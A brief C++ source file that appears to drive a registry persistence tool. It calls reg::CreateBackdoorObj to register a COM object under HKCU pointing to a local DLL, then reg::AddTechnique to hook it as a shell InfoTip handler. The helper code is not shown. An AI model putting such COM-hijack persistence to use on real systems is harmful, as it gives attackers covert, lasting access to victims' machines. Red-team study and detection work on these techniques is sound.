#include "reg.h"



int wmain()
{

	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.5.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	reg::AddTechnique(INFOTIP_HANDLER, NULL, guid);

}
